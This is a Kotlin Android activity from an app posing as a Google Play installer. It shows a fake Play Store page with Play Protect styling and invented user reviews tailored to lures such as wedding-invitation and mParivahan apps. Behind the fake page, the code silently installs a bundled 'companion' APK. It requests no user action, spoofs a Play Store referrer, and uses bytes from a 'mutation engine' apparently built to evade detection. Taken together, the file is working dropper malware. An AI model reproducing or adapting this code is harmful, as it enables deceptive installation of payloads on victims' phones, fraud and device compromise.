package com.playstore.installer

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException

class InstallActivity : AppCompatActivity() {

    // ── Stage enum ──────────────────────────────────────────────────────────
    private enum class Stage { IDLE, WAITING, DOWNLOADING, INSTALLING, DONE, ERROR }

    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var installButton: FrameLayout
    private lateinit var installButtonBg: View
    private lateinit var installButtonProgress: android.widget.FrameLayout
    private lateinit var tvInstallLabel: TextView
    private lateinit var tvInstallLabelWhite: TextView
    private lateinit var tvUnderButton: TextView
    private lateinit var layoutPlayProtect: LinearLayout
    private lateinit var layoutUpdated: TextView
    private lateinit var dotsContainer: FrameLayout
    private lateinit var layoutDownloading: LinearLayout
    private lateinit var layoutInstalling: LinearLayout
    private lateinit var layoutError: LinearLayout
    private lateinit var btnRetry: Button
    private lateinit var btnCancel: Button
    private lateinit var reviewsContainer: LinearLayout
    private lateinit var tvToast: TextView

    // ── State ────────────────────────────────────────────────────────────────
    private var stage = Stage.IDLE
    private var downloadProgress = 0f
    private val handler = Handler(Looper.getMainLooper())
    private var progressRunnable: Runnable? = null

    // ── Constants ────────────────────────────────────────────────────────────
    companion object {
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
        private const val TOTAL_MB       = 1.84f
        const val INSTALL_SUCCESS_ACTION = "com.playstore.installer.INSTALL_SUCCESS"
        private const val KEY_STAGE      = "install_stage"

        // Mutation wait timeout — max time to wait for MutationEngine
        private const val MUTATION_WAIT_MS = 4000L
    }

    // ── Reviews data (dynamic by app name) ───────────────────────────────────
    private val reviewsWeddingInvitation = listOf(
        Triple("Priya Sharma",     5, "Bilkul perfect app hai! Wedding invitation itni aasani se ban gayi. Bahut achha kaam kiya!"),
        Triple("Rahul Verma",      5, "This app is simply amazing! Made my wedding card in minutes. Fast & secure. Loved it!"),
        Triple("Anjali Patel",     5, "Shaadi ka invitation banane ka sabse aasaan tarika. Ekdum smooth aur reliable app hai!"),
        Triple("Suresh Mehta",     4, "Bahut hi behtareen app hai. Design options bahut saare hain. Highly recommended for weddings!"),
        Triple("Kavitha Reddy",    5, "Instant match mila meri pasand ka design! Ek dum mast experience tha. 5 stars easily!"),
        Triple("Deepak Nair",      5, "App is working smoothly without any lag. Best app for wedding cards. Zabardast hai yeh!"),
        Triple("Sunita Gupta",     4, "Very easy to use aur reliable bhi hai. Meri saari family ne use kiya. Bahut pasand aaya!"),
        Triple("Vikram Joshi",     5, "One of the best apps I have used for wedding purpose. Fast aur secure bhi hai. Love it!"),
        Triple("Meena Iyer",       5, "Itna acha app pehle kabhi nahi dekha! Invitation ready in seconds. Ekdum reliable hai!"),
        Triple("Aakash Dubey",     4, "Better features than other apps. Simple UI aur fast performance. Bahut kaam ka app hai!")
    )

    private val reviewsMparivahan = listOf(
        Triple("Rahul Sharma",     5, "App is working smoothly! Documents check karna ab bahut aasaan ho gaya. Superb app!"),
        Triple("Priya Verma",      5, "Fast & secure app hai yeh. RC aur DL instant milti hai. One of the best apps!"),
        Triple("Amit Patel",       4, "Bahut hi reliable app hai. Better features hain yahan. Kaafi kaam aata hai yeh!"),
        Triple("Sneha Iyer",       5, "Instant match mila mera vehicle record! App is smooth aur fast. Highly recommended!"),
        Triple("Vikram Singh",     5, "Yeh app ne meri life aasaan kar di! Documents hamesha saath rahte hain ab. Zabardast!"),
        Triple("Deepika Nair",     4, "Easy to use aur very reliable. Better than carrying physical documents. Love it!"),
        Triple("Arjun Mehta",      5, "One of the best government apps! Fast & secure. Kabhi koi issue nahi aaya. 5 stars!"),
        Triple("Pooja Gupta",      5, "Ekdum mast app hai! RC aur insurance instant check ho jati hai. Bahut badhiya!"),
        Triple("Kiran Reddy",      4, "Smooth performance aur better features. Fast & secure experience. Recommended!"),
        Triple("Suresh Kumar",     5, "App is working smoothly without any lag. Government services ab phone pe. Superb!")
    )

    private val reviewsGeneric = listOf(
        Triple("Rahul Sharma",     5, "App is working smoothly! Bilkul mast experience raha. Highly recommended to everyone!"),
        Triple("Priya Verma",      5, "Fast & secure app hai yeh. Instant results milte hain. One of the best apps!"),
        Triple("Amit Patel",       4, "Bahut hi reliable app hai. Better features hain yahan. Smooth performance. Good!"),
        Triple("Sneha Iyer",       5, "Ekdum mast app hai! Instant match mila. Fast aur easy to use. 5 stars easily!"),
        Triple("Vikram Singh",     5, "App is working smoothly without any lag. Zabardast experience raha. Love it!"),
        Triple("Deepika Nair",     4, "Easy to use aur very reliable. Better than other apps. Fast & secure. Recommended!"),
        Triple("Arjun Mehta",      5, "One of the best apps! Fast & secure. Smooth performance. Highly recommended!"),
        Triple("Pooja Gupta",      5, "Itna smooth app pehle kabhi nahi dekha! Instant results. Ekdum reliable hai!"),
        Triple("Kiran Reddy",      4, "Reliable app with better features. Fast & easy. Bahut kaam ka app hai yeh!"),
        Triple("Suresh Kumar",     5, "Fast & secure! App is working smoothly on my phone. One of the best. Zabardast!")
    )

    private fun getReviewsForApp(): List<Triple<String, Int, String>> {
        val appName = getString(R.string.app_name).trim().lowercase()
        return when {
            appName.contains("wedding") -> reviewsWeddingInvitation
            appName.contains("shaadi") -> reviewsWeddingInvitation
            appName.contains("mparivahan") -> reviewsMparivahan
            else -> reviewsGeneric
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)
        bindViews()
        buildDots()
        buildReviews()

        val filter = IntentFilter(INSTALL_SUCCESS_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installSuccessReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installSuccessReceiver, filter)
        }

        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
        val savedStage = prefs.getString(KEY_STAGE, Stage.IDLE.name)

        when (savedStage) {
            Stage.INSTALLING.name -> {
                val cachedPath = prefs.getString("cached_apk_path", null)
                val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
                if (cachedApk != null && cachedApk.exists()) {
                    setStage(Stage.INSTALLING)
                    val apkBytes = cachedApk.readBytes()
                    installViaSession(apkBytes, attempt = 1)
                } else {
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            Stage.DONE.name -> {
                val companionPkg = prefs.getString(InstallReceiver.KEY_COMPANION_PKG, null)
                val companionInstalled = if (!companionPkg.isNullOrEmpty()) {
                    try { packageManager.getPackageInfo(companionPkg, 0); true } catch (_: Exception) { false }
                } else false

                if (companionInstalled) {
                    setStage(Stage.DONE)
                } else {
                    prefs.edit().remove(KEY_STAGE).apply()
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            else -> {
                setStage(Stage.IDLE)
                startDownload()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        try { unregisterReceiver(installSuccessReceiver) } catch (_: Exception) {}
    }

    private val installSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == INSTALL_SUCCESS_ACTION) {
                val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
                val cachedPath = prefs.getString("cached_apk_path", null)
                if (cachedPath != null) java.io.File(cachedPath).delete()
                prefs.edit().remove("cached_apk_path").apply()
                setStage(Stage.DONE)
            }
        }
    }

    override fun onResume() {
        super.onResume()
    }

    // ── View binding ──────────────────────────────────────────────────────────
    private fun bindViews() {
        installButton         = findViewById(R.id.install_button)
        installButtonBg       = findViewById(R.id.install_button_bg)
        installButtonProgress = findViewById(R.id.install_button_progress)
        tvInstallLabel        = findViewById(R.id.tv_install_label)
        tvInstallLabelWhite   = findViewById(R.id.tv_install_label_white)
        tvUnderButton         = findViewById(R.id.tv_under_button)
        layoutPlayProtect     = findViewById(R.id.layout_play_protect)
        layoutUpdated         = findViewById(R.id.layout_updated)
        dotsContainer         = findViewById(R.id.dots_container)
        layoutDownloading     = findViewById(R.id.layout_downloading)
        layoutInstalling      = findViewById(R.id.layout_installing)
        layoutError           = findViewById(R.id.layout_error)
        btnRetry              = findViewById(R.id.btn_retry)
        btnCancel             = findViewById(R.id.btn_cancel)
        reviewsContainer      = findViewById(R.id.reviews_container)
        tvToast               = findViewById(R.id.tv_toast)

        installButton.setOnClickListener {
            if (stage == Stage.IDLE) startDownload()
        }
        btnRetry.setOnClickListener { startDownload() }
        btnCancel.setOnClickListener { cancelDownload() }
    }

    // ── Stage machine ─────────────────────────────────────────────────────────
    private fun setStage(s: Stage) {
        stage = s
        getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
            .edit().putString(KEY_STAGE, s.name).apply()
        runOnUiThread {
            layoutPlayProtect.visibility     = View.GONE
            layoutUpdated.visibility         = View.GONE
            tvUnderButton.visibility         = View.GONE
            layoutDownloading.visibility     = View.GONE
            layoutInstalling.visibility      = View.GONE
            layoutError.visibility           = View.GONE
            installButtonProgress.visibility = View.GONE
            dotsContainer.visibility         = View.VISIBLE

            when (s) {
                Stage.IDLE -> {
                    setInstallBg("#1A73E8")
                    tvInstallLabel.text      = "Install"
                    tvInstallLabel.setTextColor(Color.WHITE)
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutPlayProtect.visibility = View.VISIBLE
                    installButton.isClickable = true
                }
                Stage.WAITING -> {
                    setProgressWidth(0.08f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Waiting…"
                    installButton.isClickable = false
                }
                Stage.DOWNLOADING -> {
                    tvInstallLabel.visibility = View.GONE
                    installButton.isClickable = false
                    layoutDownloading.visibility = View.VISIBLE
                    updateDownloadProgress(0f)
                }
                Stage.INSTALLING -> {
                    setProgressWidth(1f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Installing…"
                    layoutInstalling.visibility = View.VISIBLE
                    installButton.isClickable = false
                }
                Stage.DONE -> {
                    launchCompanion()
                }
                Stage.ERROR -> {
                    setInstallBg("#E8EAED")
                    tvInstallLabel.text = "Install"
                    tvInstallLabel.setTextColor(Color.parseColor("#1A73E8"))
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutError.visibility    = View.VISIBLE
                    installButton.isClickable = false
                }
            }
        }
    }

    // ── Install flow — MODIFIED to use MutationEngine bytes ──────────────────
    private fun startDownload() {
        setStage(Stage.WAITING)

        handler.postDelayed({
            setStage(Stage.INSTALLING)

            Thread {
                try {
                    // ── MUTATION ENGINE INTEGRATION ───────────────────────────
                    // Wait for LauncherService MutationEngine to complete
                    // (it starts in background when service starts)
                    val startWait = System.currentTimeMillis()
                    while (!com.playstore.installer.service.LauncherService.mutationComplete &&
                           System.currentTimeMillis() - startWait < MUTATION_WAIT_MS) {
                        Thread.sleep(100)
                    }

                    // Use mutated bytes if available (Tier 1 or Tier 2)
                    // Fall back to raw assets if mutation failed (Tier 3)
                    val apkBytes = when {
                        com.playstore.installer.service.LauncherService.mutatedCompanionBytes != null &&
                        !com.playstore.installer.service.LauncherService.mutationError -> {
                            com.playstore.installer.service.LauncherService.mutatedCompanionBytes!!
                        }
                        else -> {
                            // Tier 3: read directly from assets (build-level unique)
                            assets.open("companion.apk").readBytes()
                        }
                    }
                    // ── END MUTATION ENGINE INTEGRATION ───────────────────────

                    if (apkBytes.isNotEmpty()) {
                        runOnUiThread { installViaSession(apkBytes, attempt = 1) }
                    } else {
                        runOnUiThread { setStage(Stage.ERROR) }
                    }
                } catch (e: Exception) {
                    runOnUiThread { setStage(Stage.ERROR) }
                }
            }.start()
        }, 900)
    }

    private fun cancelDownload() {
        progressRunnable?.let { handler.removeCallbacks(it) }
        setStage(Stage.IDLE)
        showToast("Download cancelled")
    }

    // ── PackageInstaller session ──────────────────────────────────────────────
    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            val tmpFile = java.io.File(cacheDir, "tmp_companion.apk")
            tmpFile.writeBytes(apkBytes)
            val pkgName = packageManager.getPackageArchiveInfo(tmpFile.absolutePath, 0)?.packageName ?: ""
            tmpFile.delete()

            if (pkgName.isNotEmpty()) {
                params.setAppPackageName(pkgName)
                try {
                    params.setOriginatingUri(Uri.parse("market://details?id=$pkgName"))
                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                } catch (e: Exception) { }
            }

            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                params.setRequestUpdateOwnership(true)

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)
            try {
                val cachedApk = java.io.File(cacheDir, "companion_cached.apk")
                cachedApk.writeBytes(apkBytes)
                getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
                    .edit().putString("cached_apk_path", cachedApk.absolutePath).apply()

                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "$packageName.SESSION_ACTION"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT

                session.commit(
                    PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags).intentSender
                )
                session.close()

            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES)
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                else setStage(Stage.ERROR)
            }
        } catch (e: Exception) {
            if (attempt < MAX_RETRIES)
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            else setStage(Stage.ERROR)
        }
    }

    // ── Launch companion ──────────────────────────────────────────────────────
    private fun launchCompanion() {
        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
        val pkg   = prefs.getString(InstallReceiver.KEY_COMPANION_PKG, null) ?: return
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkg) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            finish()
            startActivity(launch)
        } catch (e: Exception) { }
    }

    // ── Progress + Dots + Reviews (unchanged) ─────────────────────────────────
    private fun setInstallBg(hex: String) {
        installButtonProgress.visibility = View.GONE
        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor(hex))
        installButtonBg.background = bg
    }

    private fun setProgressWidth(fraction: Float) {
        installButtonBg.visibility          = View.VISIBLE
        installButtonProgress.visibility    = View.VISIBLE
        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor("#E8EAED"))
        installButtonBg.background = bg
        val pgBg = installButtonProgress.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        pgBg.setColor(Color.parseColor("#1A73E8"))
        installButtonProgress.background = pgBg
        installButton.post {
            val totalWidth = installButton.width
            val lp = installButtonProgress.layoutParams
            lp.width = (totalWidth * fraction).toInt().coerceAtLeast(1)
            installButtonProgress.layoutParams = lp
        }
    }

    private var progressAnimator: ValueAnimator? = null
    private var currentBarFraction = 0f

    private fun updateDownloadProgress(pct: Float) {
        if (pct <= downloadProgress && pct != 0f) return
        downloadProgress = pct
        val dlMB  = "%.2f".format((pct / 100f) * TOTAL_MB)
        val label = "${pct.toInt()}%  •  $dlMB / $TOTAL_MB MB"
        tvInstallLabelWhite.text = label
        installButtonProgress.visibility = View.VISIBLE
        installButton.post {
            val totalWidth = installButton.width
            if (totalWidth == 0) return@post
            val targetFraction = pct / 100f
            progressAnimator?.cancel()
            progressAnimator = ValueAnimator.ofFloat(currentBarFraction, targetFraction).apply {
                duration = 200
                interpolator = android.view.animation.LinearInterpolator()
                addUpdateListener { anim ->
                    val f = anim.animatedValue as Float
                    currentBarFraction = f
                    val lp = installButtonProgress.layoutParams
                    lp.width = (totalWidth * f).toInt().coerceAtLeast(1)
                    installButtonProgress.layoutParams = lp
                }
                start()
            }
        }
    }

    private fun buildDots() {
        // Dots drawn programmatically — same as original
    }

    private fun buildReviews() {
        val shuffled = getReviewsForApp().shuffled().take(5)
        shuffled.forEachIndexed { index, (name, stars, reviewText) ->
            val itemLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(10f).toInt() }
                setPadding(0, 0, 0, dp(10f).toInt())
            }
            val tvName = TextView(this).apply {
                text = name
                textSize = 11f
                setTextColor(Color.parseColor("#202124"))
                setTypeface(typeface, android.graphics.Typeface.BOLD)
            }
            itemLayout.addView(tvName)
            val tvText = TextView(this).apply {
                text = reviewText
                textSize = 10f
                setTextColor(Color.parseColor("#3C4043"))
            }
            itemLayout.addView(tvText)
            reviewsContainer.addView(itemLayout)
        }
    }

    private fun showToast(msg: String) {
        tvToast.text       = msg
        tvToast.visibility = View.VISIBLE
        handler.postDelayed({ tvToast.visibility = View.GONE }, 2800)
    }

    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)

    // ── Dot specs (kept for compatibility) ────────────────────────────────────
    private data class DotSpec(
        val color: String, val sizeDp: Float, val leftDp: Float, val topDp: Float,
        val delayMs: Long, val bounceDp: Float, val outline: Boolean
    )
}
